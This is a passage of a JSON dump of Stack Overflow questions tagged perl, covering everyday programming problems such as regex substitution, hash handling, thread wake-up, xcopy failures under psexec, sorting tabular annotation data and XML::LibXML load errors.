file:</p>\n\n<pre><code>Host ssh.foo.com\n    User ssh\n    HostName ssh.foo.com\n    Port 443\n    ProxyCommand /usr/local/bin/corkscrew proxy 8080 %h %p ~/.ssh/proxyauth\n\nHost ci\n    HostName 127.0.0.2\n    User ci\n\nHost nightly\n    HostName 192.168.1.1\n    User goodnight\n\nHost foobar.org\n    User git\n    HostName foobar.org\n    Port 443\n    ProxyCommand /usr/local/bin/corkscrew proxy 8080 %h %p ~/.ssh/proxyauth\n\nHost integration\n    HostName 192.168.1.2\n    User int\n</code></pre>\n\n<p>The expected output should look like this:</p>\n\n<pre><code>Host: ssh.foo.com - Proxy: /usr/local/bin/corkscrew proxy 8080 %h %p ~/.ssh/proxyauth\nHost: foobar.org - Proxy: /usr/local/bin/corkscrew proxy 8080 %h %p ~/.ssh/proxyauth\n</code></pre>\n\n<p>The difficulty here is that the search has to cover multiple lines.</p>\n"},{"tags":["perl","cpan"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":2,"view_count":41,"score":-2,"question_id":12472626,"title":".cpan/Metadata:how to edit to reinstall a model","body":"<p>I use cpan to install <code>Carton</code>. When I run this command first, the output is <code>URL can't found</code>. When I run this command second, the output is follows:</p>\n\n<pre><code>Going to read '/home/hengaini/.cpan/Metadata'\nWarning: Cannot install Carton, don't know what it is.\nTry the command\n    i /Carton/\nto find objects with matching identifiers.\n</code></pre>\n\n<p>I think the file <code>/home/hengaini/.cpan/Metadata</code> can edit manual or by some tool to go back the first enrionment.\n  What's the problems.</p>\n"},{"tags":["perl","unix","job-scheduling"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":1,"view_count":64,"score":1,"question_id":12788246,"title":"Perl Distributed Job Queue","body":"<p>I need to setup a job queue where long running job queues are scheduled via a web interface. And are then run on multiple boxes. I also need the ability to remove and reorder jobs in the queue. </p>\n\n<p>Currently all our code is in perl. I was looking in to using something like ApacheMQ, Gearman, Resque, etc... </p>\n\n<p>The question, Would one of the ones mentioned before be better suitable for the job, what about a different software solution? I was originality planning just writing a MySQL/Perl queue, but that's quite difficult. I would prefer something with a decent web interface, and have an interface into Perl. A pure MySQL/Perl would be ideal. </p>\n\n<p>Thanks</p>\n"},{"tags":["perl"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":46,"score":0,"question_id":12789908,"title":"How to extract the last element of a string and use it to grow an array inside a loop","body":"<p>I have a dataset like this:</p>\n\n<pre><code>10001;02/07/98;TRIO;PI;M^12/12/59^F^^SP^09/12/55\n\n;;;;;M1|F1|SP1;11;10;12;10;12;11;1.82;D16S539\n\n;;;;;M1|F1|SP1;8;8;8;8;10;8;3.45;D7S820\n\n;;;;;M1|F1|SP1;14;12;12;11;14;11;1.57;D13S317\n\n;;;;;M1|F1|SP1;12;12;13;12;13;8;3.27;D5S818\n\n;;;;;M1|F1|SP1;12;12;12;12;12;8;1.51;CSF1PO\n\n;;;;;M1|F1|SP1;8;11;11;11;11;8;1.79;TPOX\n\n;;;;;M1|F1|SP1;6;9;9;6;8;6;1.31;TH01\n</code></pre>\n\n<p>I'm trying to extract the last element of the lines which does not start with a number, i.e. all lines except the first one. I want to put these values inside an array called @markers.</p>\n\n<p>I'm trying that by the following code:</p>\n\n<pre><code>#!usr/bin/perl\nuse warnings;\nuse strict;\n\nopen FILE, 'test' || die $!;\n\nwhile (my $line = &lt;FILE&gt;) {\n\n    my @fields = (split /;/), $line;\n\n    if ($line !~ m/^[0-9]+/) {\n\n    my @markers = splice @fields, 0, @fields - 1;\n\n    }\n}\n</code></pre>\n\n<p>But that does not work. Can anyone help please?\nThanks</p>\n"},{"tags":["javascript","html","asp.net-mvc","perl","iframe"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":84,"score":1,"question_id":12785560,"title":"Iframe url manipulation and add as query string","body":"<p>I have a legacy application that runs in perl. I developed an MVC application with just one default.aspx. Inside default.aspx i put a master page and an iframe to open the legacy application url. What i want to do is everytime, the iframe tries to navigate to next page (i mean, within iframe), i want to capture the url in my default.aspx and add a querystring to the iframe's src</p>\n\n<p>Example:</p>\n\n<p>In legacy application, the first page is  http ://iframe.com/index.cgi. Clicking on a link in index.cgi and it goes to http: //iframe.com/product.cgi</p>\n\n<p>In my MVC application, i will open \"http ://iframe.com/index.cgi?MyQueryString\" in iframe. When we click on the link in index.cgi, as per legacy application, it will try to move to http: //iframe.com/product.cgi. But I want to make it \"http: //iframe.com/product.cgi?MyQueryString\"</p>\n\n<hr>\n\n<p>Any idea how to achieve this please?</p>\n\n<p>P.S. I am not allowed to change anything in the legacy perl application. All i can do should be done in the Default.aspx only</p>\n"},{"tags":["java","perl"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":62,"score":1,"question_id":12789119,"title":"Perl Script Not Running in Java","body":"<p>I am writing code to run a perl script from java. The command I am providing to java program  is working perfectly fine through shell. However, the same command returns an exit code 2 when supplied to Runtime's exec() method. Why this is happening ?</p>\n\n<p>My code is :</p>\n\n<pre><code>package org.nlp.rishabh;\n\nimport java.io.BufferedReader;\nimport java.io.InputStreamReader;\n\npublic class ReferenceExtractor {\npublic static void main( String[] args ) throws Exception {\n\n    String parscitCommand = \"/home/rishabh/Desktop/parscit/bin/citeExtract.pl \";\n    String parscitOptions = \"-m \";\n    String parscitAction = \"extract_all \";\n    String paperPath = \"/home/rishabh/Desktop/aas.txt\";\n    String xml = null;\n\n    String command = parscitCommand + parscitOptions + parscitAction + paperPath;\n    System.out.println( command );\n\n    try {\n        Runtime runtime = Runtime.getRuntime();\n        Process pr = runtime.exec( command );\n//      Process pr = runtime.exec( new String[] { \"perl\", parscitCommand, parscitOptions, parscitAction, paperPath } );\n\n        BufferedReader reader = new BufferedReader( new InputStreamReader( pr.getInputStream() ) );\n        String temp;\n        StringBuilder sb = new StringBuilder();\n\n        while ( ( temp = reader.readLine() ) != null ) {\n            sb.append( temp );\n        }\n\n        xml = sb.toString();\n\n        int returnVal = pr.waitFor();\n        System.out.println( returnVal );\n    } catch ( Exception e ) {\n        e.printStackTrace();\n    }\n\n    System.out.println( xml );\n}\n}\n</code></pre>\n"},{"tags":["database","perl","sqlite","matlab","in-memory"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":342,"score":1,"question_id":9817195,"title":"Loading existing Sqlite database into memory for fast computation","body":"<p>Does anyone knows how to load an existing database (Sqlite 3) into memory for fast computation in Perl, MATLAB or Java? Perl is preferred?</p>\n\n<p>I am working on a project that needs intensive computation, and I want to keep the real database fixed. So I want to read the entire Sqlite3 database into memory and perform anything there in memory.</p>\n\n<p>I know the basics of in-memory database connection, but seems like Perl can only create a new database using this way, rather than loading an existing one (which is the option I want to implement).</p>\n"},{"tags":["arrays","perl","contains"],"answer_count":2,"favorite_count":1,"up_vote_count":3,"down_vote_count":0,"view_count":60,"score":3,"question_id":12788397,"title":"Perl - Generating Unique Identifiers","body":"<p>first of all, I have to admit that I am new to Perl, so my question might seem quite rubish for some you, and I am sorry. I am currently working with the VMWare SDK for Perl and I am stuck on my uploading function. What I would like to do, is generate a unique identifier for each VMDKs (e.g. hard-disks I add to a VM). Basically, the user provides that the hard-disk should have as a parameter of the script.</p>\n\n<p>However, we have a problem if the user choses a name which is already taken. I thought about many solutions, like adding a timestamp (which would be unique), but I would like something more elegant. So, let us consider :</p>\n\n<p><strong>@vmdks</strong> : List all the hard-disks which are already on the VM</p>\n\n<p><strong>$filename</strong> : Name that the user wants to give to the VMDK, once it is on the VM</p>\n\n<p><strong>$target</strong> : Name that the hard-disk will ACTUALLY have.</p>\n\n<p>I would like something like filename-00X, where X is the occurence. So for example, if someone tries to add a hard-disk called \"FOO\", while one already exists, it will be renamed into \"FOO-001\". Note that the user can only enter a disk name with Alphanumerical characters, so he cannot name a hard-disk \"FOO-001\", which avoids conflicts.</p>\n\n<p>So since I do not know Perl very much, I decided to write it in pseudo-code, hope you do not mind : </p>\n\n<pre><code>IF $filename IS IN @vmdks\n   # So here we have a conflict\n\n   IF $filename-X IS IN @vmdks  \n      # X should be a 3-digit number, like 001, 002, 666, etc.\n      INDEX := X\n      INDEX++\n      $target = $filename-INDEX\n   ELSE\n      $target = $filename-001\n   ENDIF\nELSE\n   $target = $filename \nENDIF\n</code></pre>\n\n<p>I guess I can easily do the first condition by something like : </p>\n\n<pre><code>if(grep{$_ eq $filename} @vmdks) ...\n</code></pre>\n\n<p>But the second one... I am really stuck :/ How could I match $filename-index, and then retrieve the latter?</p>\n\n<p>Thank you very much, I hope I was clear enough</p>\n"},{"tags":["perl"],"answer_count":4,"favorite_count":0,"up_vote_count":5,"down_vote_count":0,"view_count":164,"score":5,"question_id":12783681,"title":"Is there an \"undefined but true\" value analogous to \"0 but true\"?","body":"<p>I'm writing a search routine where undefined and zero are both valid results.  I'm returning a two element array like <code>($result, $answer)</code> because I don't have an \"undefined but true\" value.  It works fine but is a bit klutzy.  A class seems like overkill.</p>\n\n<p>Does such a thing exist or can be faked somehow?  I'm thinking of things like the <code>0E0</code> trick, etc.</p>\n\n<p>More details.  This is the user interface I would like.  The current routine returns two values, the result  (whether or not the key was found) and a value if it was.</p>\n\n<pre><code>my $result = search_struct($key, $complex_data_structure);\nif ($result) {\n    print \"A result was found for $key!  Value is: \", $result // \"Undefined!\", \"\\n\";\n}\nelse {\n    print \"Sorry, no result was found for $key.\\n\";\n}\n</code></pre>\n"},{"tags":["javascript","perl","cgi","export-to-excel"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":58,"score":0,"question_id":12787290,"title":"How to use perl cgi to export to excel with group and outline information","body":"<p>I am writing a website using perl(cgi)/js(jQuery)/Apache. Currently, I am using <code>'application/vnd.ms-excel'</code> to export an html table structure to excel. For somehow, I need to create an excel spread sheet with outline and grouping structure. Do we have a simple way to do that? Do we have to use something like Spreadsheet::WriteExcel module? </p>\n\n<p>Thanks in advance.</p>\n"},{"tags":["perl","hash"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":52,"score":0,"question_id":12785630,"title":"Perl Hash of Hash Output","body":"<p>I'm reading a file.  I want a hash that gives me the first number of a line as a key to a hash of all the numbers of the rest of the line to 1.  </p>\n\n<p>I believe I'm adding the hash correctly, because Dumper prints correctly.\nHowever, print \"$first $secondID\\n\" is not giving me any output.  </p>\n\n<pre><code>while (&lt;FILE&gt;) {\n\n    chomp $_;\n\n    if (/(\\d+)\\t(.+)/) {\n\n        $firstNum = $1;\n        @seconds  = split(/\\,/,$2);\n\n        foreach $following (@seconds) {\n\n            $Pairs-&gt;{$firstNum}{$following} = 1;\n        }\n\n        foreach $first (sort {$a &lt;=&gt; $b} keys %Pairs) {\n\n            print \"$first\\n\";\n            %second = {$Pairs{$first}};\n\n            foreach $secondID (sort {$a &lt;=&gt; $b} keys %second) {\n\n                print \"$first $secondID\\n\";\n            }\n        }\n        print Dumper($Pairs);\n    }\n    else {\n\n        print \"ERROR\\n\";\n    }\n}\n</code></pre>\n\n<p>Later on, given a pair of numbers I would like to look up to see whether $Pairs{$num1}{$num2} is defined.  would I write </p>\n\n<pre><code>if(defined $Pairs{$num1}{$num2})\n</code></pre>\n\n<p>Or should I check the first key first.  Then check the second key</p>\n\n<pre><code>if (defined $Pairs{$num1}) {\n\n    $temp = $Pairs{$num1};\n    if (defined $temp{$num2}) {\n\n        print \"true\\n;\n    }\n}\n</code></pre>\n"},{"tags":["perl","unix","awk","grep","sh"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":1,"view_count":58,"score":0,"question_id":12694157,"title":"Read word from a file and return next word","body":"<p>Using shell script I want to read a word from text file and return next column word.</p>\n\n<p>For eg, my input file will be like</p>\n\n<pre><code>AGE1 PERSON1\nAGE2 PERSON2\nAGE3 PERSON3\nAGE4 PERSON4\n</code></pre>\n\n<p>I have variable in Sh file having PERSON's name.\nI want read input text file and get value of person's age.</p>\n\n<p>Please help, i'm beginner in Shell Scripting</p>\n"},{"tags":["perl"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":68,"score":2,"question_id":12786194,"title":"perl inline edit in perl script","body":"<p>I have following line in my perl script (which I run from cshell)</p>\n\n<pre><code>system(\"perl -p -i -e 's/\\+[a-z]+\\+//g' $file1\");\n</code></pre>\n\n<p>I expect it to delete all the words which are surrounded by + plus signs. Instead, I'm getting below error message.</p>\n\n<blockquote>\n  <p>Quantifier follows nothing in regex; marked by &lt;-- HERE in m/+ &lt;-- HERE [a-z]++/ at -e line 1.</p>\n</blockquote>\n\n<p>What is happening? I gave backslashes, why then this error?</p>\n"},{"tags":["html","perl","parsing","html-parsing"],"answer_count":4,"favorite_count":1,"up_vote_count":5,"down_vote_count":0,"view_count":231,"score":5,"question_id":11335503,"title":"How to parse invalid HTML with Perl?","body":"<p>I maintain a database of articles with HTML formatting. Unfortunately the editors who wrote articles didn't know proper HTML, so they often have written stuff like:</p>\n\n<pre><code>&lt;div class=\"highlight\"&gt;&lt;html&gt;&lt;head&gt;&lt;/head&gt;&lt;body&gt;&lt;p&gt;Note that ...&lt;/p&gt;&lt;/html&gt;&lt;/div&gt;\n</code></pre>\n\n<p>I tried using <code>HTML::TreeBuilder</code> to parse this HTML but after parsing it and dumping the resulting tree, all the elements between <code>&lt;div class=\"highlight\"&gt;...&lt;/div&gt;</code> are gone. I'm left with just <code>&lt;div class=\"highlight\"&gt;&lt;/div&gt;</code>.</p>\n\n<p>The editors often have also done things like:</p>\n\n<pre><code>&lt;div class=\"article\"&gt;&lt;style&gt;@font-face {   font-family: \"Cambria\"; }&lt;/style&gt;Article starts here&lt;/div&gt;\n</code></pre>\n\n<p>Parsing this with <code>HTML::TreeBuilder</code> results in empty <code>&lt;div class=\"article\"&gt;&lt;/div&gt;</code> again.</p>\n\n<p>Any ideas how to approach this broken HTML and actually make sense out of it?</p>\n"},{"tags":["windows","perl","clearcase","xcopy","psexec"],"answer_count":5,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":449,"score":3,"question_id":10526486,"title":"Why does Windows XCOPY fail when invoked via Perl system call via psexec?","body":"<p>I'm using psexec to launch a Perl program on remote Windows machines. The program makes a system call to xcopy.This works fine when run directly (locally) on the machines, but when run remotely via psexec, the xcopy fails with the following message:</p>\n\n<blockquote>\n  <p>File creation error - Incorrect function.</p>\n</blockquote>\n\n<p>(Depending on the user, the message may instead be \"Access denied.\")</p>\n\n<p>Note that $! gives the following diagnostic:</p>\n\n<blockquote>\n  <p>Bad file descriptor at syscall.pl. \n  perl exited on REMOTE with error code 9.</p>\n</blockquote>\n\n<p>It does not seem to make a difference whether xcopy is invoked via system() or backticks.</p>\n\n<p>I should point out that the \"from\" folder is a ClearCase dynamic view (M drive).</p>\n\n<p>Oddly enough, the xcopy seems to work correctly when called directly from psexec. </p>\n\n<p>Here are some other oddities:</p>\n\n<ol>\n<li><p>The xcopy doesn't always fail. Certain files just seem to be \"cursed\". The read-only attribute appears not to be a factor.</p></li>\n<li><p>Once a copy succeeds (e.g., via Windows Explorer), the curse is lifted, and that particular file will no longer cause xcopy errors.</p></li>\n<li><p>The problem does not seem to be with the destination folder. Once the curse is lifted, the file can be xcopy'd to a new destination.</p></li>\n</ol>\n\n<p>Following is a portion of the test Perl script I used to narrow down the problem (folder names have been genericized).\nNote that, for each \"my $cmd\" tested, I commented out the previous one, and added a status comment. </p>\n\n<pre><code># ClearCase directory M:\\STUFF\\ABC contains ABC.tst, ABC.zip and several nonempty subfolders\n\n# Directory copy, D drive to D drive\n#my $cmd = \"xcopy D:\\\\temp\\\\src D:\\\\temp\\\\dest /e /i /y\";\n# works\n\n# Directory copy, M drive to D drive\n#my $cmd = \"xcopy M:\\\\STUFF\\\\ABC D:\\\\temp\\\\dest /e /i /k /y\";\n# fails with \"File creation error - Incorrect function\" or \"Access denied\"\n\n# File copy (.tst), M drive to D drive (trailing backslash)\n#my $cmd = \"xcopy M:\\\\STUFF\\\\ABC\\\\ABC.tst D:\\\\temp\\\\dest\\\\\";\n# works!\n\n# Directory copy, M drive to D drive (trailing backslash)\n#my $cmd = \"xcopy M:\\\\STUFF\\\\ABC D:\\\\temp\\\\dest\\\\ /e /i /k /y\";\n# copies the .tst file, but fails on the .zip (yes, the .tst file is now getting copied)\n\n# Directory copy, M drive to D drive (same as above but without trailing backslash)\n#my $cmd = \"xcopy M:\\\\STUFF\\\\ABC D:\\\\temp\\\\dest /e /i /k /y\";\n# copies the .tst file, but fails on the .zip\n\n# File copy (.zip), M drive to D drive\n#my $cmd = \"xcopy M:\\\\STUFF\\\\ABC\\\\ABC.zip D:\\\\temp\\\\dest\";\n# fails \n\n# File copy (.zip), M drive to D drive (trailing backslash)\n#my $cmd = \"xcopy M:\\\\STUFF\\\\ABC\\\\ABC.zip D:\\\\temp\\\\dest\\\\\";\n# fails\n\n# After manually (Windows Explorer) copying the .zip file to the dest folder and deleting it  \n# Directory copy, M drive to D drive with /c (continue after failure)\n#my $cmd = \"xcopy M:\\\\STUFF\\\\ABC D:\\\\temp\\\\dest /c /i /e\";\n# copies the .tst and .zip file (!), but fails on all other files (folders were successfully created)\n\n# After manually copying the Folder1 folder to the dest folder and then deleting it  \n#my $cmd = \"xcopy M:\\\\STUFF\\\\ABC D:\\\\temp\\\\dest /c /i /e\";\n# copies the .tst and .zip file and the contents of Folder1(!), but fails on all other files\n\n# Different dest:\nmy $cmd = \"xcopy M:\\\\STUFF\\\\ABC D:\\\\temp\\\\dest1 /c /i /e\";\n# Same results as immediately above\n\nprint \"Executing system command: $cmd ...\\n\";\nsystem ($cmd);\n#print(`$cmd 2&gt;&amp;1`); #same\n</code></pre>\n"},{"tags":["string","perl","types","integer"],"answer_count":8,"favorite_count":1,"up_vote_count":10,"down_vote_count":0,"view_count":223,"score":10,"question_id":12686335,"title":"How to tell apart numeric scalars and string scalars in Perl?","body":"<p>Perl usually converts numeric to string values and vice versa transparently. Yet there must be something which allows e.g. <code>Data::Dumper</code> to discriminate between both, as in this example:</p>\n\n<pre><code>use Data::Dumper;\nprint Dumper('1', 1);\n\n# output:\n$VAR1 = '1';\n$VAR2 = 1;\n</code></pre>\n\n<p>Is there a Perl function which allows me to discriminate in a similar way whether a scalar's value is stored as number or as string?</p>\n"},{"tags":["python","linux","perl","bash","terminal"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":26,"score":0,"question_id":12784893,"title":"iMacros-like program for terminal?","body":"<p>Is there such a program for Terminal like the iMacros plugin for Firefox, that can record what I did, then automatic do the work I have done? I hope that there is such a program to help me do the repeat work in the terminal, so any tips?  </p>\n\n<p>Regards</p>\n"},{"tags":["perl","shuffle"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":60,"score":1,"question_id":12783469,"title":"shuffle url parameter behind & in Perl","body":"<p>Hello i was wondering if anyone know how to shuffle an url with perl, but then only all parameters after the <code>&amp;</code>.</p>\n\n<p>here's an example:</p>\n\n<p><code>anyurl=i&amp;ct=1&amp;cad=1&amp;rsm=6&amp;ei=JthyULClH8fH0QWcooD4Bw&amp;zx=1349703728841</code></p>\n\n<p>here's what im looking for:</p>\n\n<p><code>anyurl=i&amp;ei=JthyULClH8fH0QWcooD4Bw&amp;cad=1&amp;ct=1&amp;rsm=6&amp;zx=1349703728841</code></p>\n\n<p>just so that all parameters behind the &amp; are placed on a different place randomly. So i want all parameters behind the <code>&amp;</code> on a different place every print, is this possible?</p>\n\n<p>thnx in advance.</p>\n"},{"tags":["regex","perl"],"answer_count":2,"favorite_count":0,"up_vote_count":6,"down_vote_count":0,"view_count":124,"score":6,"question_id":12757696,"title":"Perl. Regexp work only once","body":"<p>I need to process the string with regexp and change x->y if is number around.</p>\n\n<p><strong>String</strong>: <code>2x2x2 2x 2x2x 2x2x2x2x2</code></p>\n\n<p><strong>Regexp</strong>: <code>s/([0-9])x([0-9])/$1y$2/g</code></p>\n\n<pre><code>my $string = \"2x2x2 2x 2x2x 2x2x2x2x2\";\n\n$string =~ s/([0-9])x([0-9])/$1y$2/g;\n\nprint \"$string\\n\";\n</code></pre>\n\n<p>I expect: <code>2y2y2 xx 2x 2y2x 2y2y2y2y2</code></p>\n\n<p>But result: <code>2y2x2 2x 2y2x 2y2x2y2x2</code> (not all 2x2 changed)</p>\n\n<p>What should I do?</p>\n"},{"tags":["multithreading","perl"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":254,"score":1,"question_id":6001260,"title":"How to wake a thread in Perl","body":"<p>Is there any way for waking a sleeping thread using its thread ID in Perl ? Thanks in advance</p>\n\n<p>Below is the what I have tried using suspend and resume </p>\n\n<pre><code>use warnings;\nuse strict;\nuse threads;\nuse threads::shared;\nuse Thread::Suspend;  \n\nmy $val:shared = 0;\nmy $count = 0; \nwhile ( $count &lt; 4 )\n{\n    my $thr = threads-&gt;create( \\&amp;worker );\n    $count++;\n}\n\nuse Tk;\nmy $mw = MainWindow-&gt;new();\n$mw-&gt;protocol('WM_DELETE_WINDOW' =&gt; sub { &amp;clean_exit }); \nmy $thr;\nmy $button;\n$button = $mw-&gt;Button(\n        -text =&gt; 'Invoke thread',\n        -command =&gt; sub{\n            $val += 1;\n            if( $val &gt; 4)\n            {\n                $val = 1;\n            }   \n            foreach $thr (threads-&gt;list()) \n            {\n                if( $thr-&gt;tid() == $val )\n                {\n                    $thr-&gt;resume();\n                    goto OUTSIDE;\n                }\n            }\n            OUTSIDE:                                                \n        })-&gt;pack();\n\nMainLoop;\n\nsub clean_exit\n{\n    my @running_threads = threads-&gt;list;\n    if (scalar(@running_threads) &lt; 1)\n    {\n        print \"\\nFinished\\n\";\n        exit;\n    }\n    else\n    {\n        foreach my $thr (threads-&gt;list()) \n        {\n            $thr-&gt;kill('KILL')-&gt;detach();\n        }\n        exit;\n    }\n}\n\nsub worker\n{\n    $SIG{'KILL'} = sub { threads-&gt;exit(); };\n    threads-&gt;suspend();\n    print threads-&gt;tid().\"\\n\";  \n}\n</code></pre>\n\n<p>What I am trying to do is when user click on Invoke button it should resume the thread based on the $val. But its not working in that way. First thread with ID 4 is resume that too after 4 clicks instead of 1. Please help in debugging the code. P.S. I am newbie to Perl</p>\n"},{"tags":["iphone","perl"],"answer_count":5,"favorite_count":1,"up_vote_count":5,"down_vote_count":2,"view_count":2663,"score":3,"question_id":1888723,"title":"How can I develop an iPhone application in Perl?","body":"<p>Could someone provide a good link to book about how to develop iPhone application with the Perl programming language?</p>\n"},{"tags":["perl","unix","sorting"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":58,"score":0,"question_id":12778337,"title":"Sort by numbers in a specific column","body":"<p>I have data in this format (tab separated columns)... </p>\n\n<pre><code>Name_00001  Annotation_1    gene    329412  330509  .   -   .   ID=TAXON_00029;Name=TAXON_00029\nName_00001  Annotation_1    mRNA    329412  330509  .   -   .   ID=TAXON_00029T0;Parent=TAXON_00029\nName_00001  Annotation_1    exon    193957  194252  .   +   .   ID=exon:TAXON_00022T0:1;Parent=TAXON_00022T0\nName_00001  Annotation_1    exon    195500  197118  .   +   .   ID=exon:TAXON_00022T0:2;Parent=TAXON_00022T0\n</code></pre>\n\n<p>...and I would like to sort by the first 5 numbers in column 9 in ascending order. I.e. so the file looks like this:</p>\n\n<pre><code>Name_00001  Annotation_1    exon    193957  194252  .   +   .   ID=exon:TAXON_00022T0:1;Parent=TAXON_00022T0\nName_00001  Annotation_1    exon    195500  197118  .   +   .   ID=exon:TAXON_00022T0:2;Parent=TAXON_00022T0    \nName_00001  Annotation_1    gene    329412  330509  .   -   .   ID=TAXON_00029;Name=TAXON_00029\nName_00001  Annotation_1    mRNA    329412  330509  .   -   .   ID=TAXON_00029T0;Parent=TAXON_00029\n</code></pre>\n\n<p>I have tried to use Unix or Perl, but my skills are very limited...</p>\n"},{"tags":["perl","utf-8"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":1,"view_count":88,"score":0,"question_id":12781629,"title":"How to convert ASCII format into UTF8 in Perl","body":"<p>eg: <code>&amp;#233;</code> into <code>Ã©</code></p>\n\n<p>Sometimes user getting ascii format character set rather than french character set... So can any one assist Me is there any function in perl that can convert ascii to UTF-8</p>\n"},{"tags":["xml","perl","libxml"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":29,"score":0,"question_id":12782169,"title":"Perl XML::libXML does'nt work anymore : Can't load '/usr/lib/perl5/vendor_perl/5.8/msys/auto/XML/LibXML/Common/Common.dll","body":"<blockquote>\n  <p><strong>Possible Duplicate:</strong><br>\n  <a href=\"http://stackoverflow.com/questions/12779400/cant-load-usr-lib-perl5-vendor-perl-5-8-msys-auto-xml-libxml-common-common-dl\">Can&#39;t load &#39;/usr/lib/perl5/vendor_perl/5.8/msys/auto/XML/LibXML/Common/Common.dll&#39; for module XML::LibXML::Common: dlopen: Win32 error 126</a>  </p>\n</blockquote>\n\n\n\n<p>I have this dummy script who worked previously :</p>\n\n<pre><code>#!/usr/bin/perl\nuse utf8; \nuse strict;\nuse warnings;\nuse XML::LibXML;\n\nmy $parser = XML::LibXML-&gt;new();\n\nprint \"test ok\\n\";\n</code></pre>\n\n<p>But today, it trows an error : </p>\n\n<pre><code>Can't load '/usr/lib/perl5/vendor_perl/5.8/msys/auto/XML/LibXML/Common/Common.dll' for module XML::LibXML::Common: dlopen: Win32 error 126 at /usr/lib/perl5/5.8/msys/DynaLoader.pm line 230.\n at /usr/lib/perl5/vendor_perl/5.8/msys/XML/LibXML.pm line 12\nCompilation failed in require at /usr/lib/perl5/vendor_perl/5.8/msys/XML/LibXML.pm line 12.\nBEGIN failed--compilation aborted at /usr/lib/perl5/vendor_perl/5.8/msys/XML/LibXML.pm line 12.\nCompilation failed in require at D:\\Projets\\Maroc Scada\\Rabat 41 - Images T200i-DRR-F200C\\script_PI\\test.pl line 5.\nBEGIN failed--compilation aborted at D:\\Projets\\Maroc Scada\\Rabat 41 - Images T200i-DRR-F200C\\script_PI\\test.pl line 5.\n</code></pre>\n\n<p>I reinstall Perl completely and reinstall the module libxml-perl 0.08 today but this didn't help.</p>\n\n<p>Any idea would be greatly appreciated...</p>\n"},{"tags":["python","perl","bash","shell"],"answer_count":3,"favorite_count":1,"up_vote_count":0,"down_vote_count":4,"view_count":97,"score":-4,"question_id":12779212,"title":"Editing the data in last column","body":"<p>I have a datafile (tab separated) which looks like this:</p>\n\n<pre><code>chr1    38045559    38046059    chr1:38045559-38046559_NM_001142726_C1orf122_+,chr1:38045559-38046559_NM_198446_C1orf122_+,chr1:38045952-38046952_NM_024640_YRDC_-\nchr1    205291045   205291545   chr1:205290545-205291545_NM_018566_YOD1_-\nchr1    1499717 1500625 chr1:1499625-1500625_NM_014188_SSU72_-\nchr1    1679941 1680441 chr1:1679441-1680441_NM_001198995_NADK_-\nchr1    1699769 1700657 chr1:1699269-1700269_NM_023018_NADK_-,chr1:1699657-1700657_NM_001198993_NADK_-\nchr1    1701368 1701868 chr1:1700868-1701868_NM_001198994_NADK_-\nchr1    1812386 1812886 chr1:1811886-1812886_NM_002074_GNB1_-\nchr1    2066155 2066655 \nchr1    2149493 2149993 chr1:2149493-2150493_NM_003036_SKI_+\nchr1    2312573 2313353 chr1:2312353-2313353_NM_024848_MORN1_-,chr1:2312573-2313573_NM_007033_RER1_+\n</code></pre>\n\n<p>Where:</p>\n\n<ul>\n<li>the first three columns are the co-ordinates and </li>\n<li>the last column contains a set of zero or more annotation records\n<ul>\n<li>each annotation record is seperated by a comma</li>\n<li>fields within the annotation record are seperated by an underscore or a colon</li>\n</ul></li>\n</ul>\n\n<p>What I want is to get the first three columns as it is and the fifth field from each annotation record. for example for row 1 the output should be something like this</p>\n\n<pre><code>chr1    38045559    38046059   C1orf122\n                               C1orf122\n                               YRDC\n</code></pre>\n\n<p>What I have done, is I have already splited my data in last column based on comma \",\" </p>\n\n<p>using <code>tr ',' '\\t' &lt;input&gt;temp1</code></p>\n\n<p>Now what I have is a file which looks like this </p>\n\n<pre><code>chr1    38045559    38046059    chr1:38045559-38046559_NM_001142726_C1orf122_+  chr1:38045559-38046559_NM_198446_C1orf122_+ chr1:38045952-38046952_NM_024640_YRDC_-\nchr1    205291045   205291545   chr1:205290545-205291545_NM_018566_YOD1_-\nchr1    1499717 1500625 chr1:1499625-1500625_NM_014188_SSU72_-\nchr1    1679941 1680441 chr1:1679441-1680441_NM_001198995_NADK_-\nchr1    1699769 1700657 chr1:1699269-1700269_NM_023018_NADK_-   chr1:1699657-1700657_NM_001198993_NADK_-\nchr1    1701368 1701868 chr1:1700868-1701868_NM_001198994_NADK_-\nchr1    1812386 1812886 chr1:1811886-1812886_NM_002074_GNB1_-\nchr1    2066155 2066655 \nchr1    2149493 2149993 chr1:2149493-2150493_NM_003036_SKI_+\nchr1    2312573 2313353 chr1:2312353-2313353_NM_024848_MORN1_-  chr1:2312573-2313573_NM_007033_RER1_+\n</code></pre>\n\n<p>Now, I need a bit of your expertise to get me to the desired output format. </p>\n\n<p>Please guide me to get the desired output in  python/perl/shell.</p>\n"},{"tags":["perl","shell","configuration"],"answer_count":2,"favorite_count":1,"up_vote_count":2,"down_vote_count":0,"view_count":70,"score":2,"question_id":12780518,"title":"What is the best way to share a config file between Perl scripts and bash scripts?","body":"<p>I have a system that is composed of both bash scripts and Perl scripts.</p>\n\n<p>Is there a safe way to specify config values that are used by both Perl scripts and shell scripts?</p>\n\n<p>We need both as there are common elements which are simple MY_VAR=toto declarations along with Perl specific config values, e.g. hashes.</p>\n\n<p>BTW We don't have the Env module available in our hardened Perl 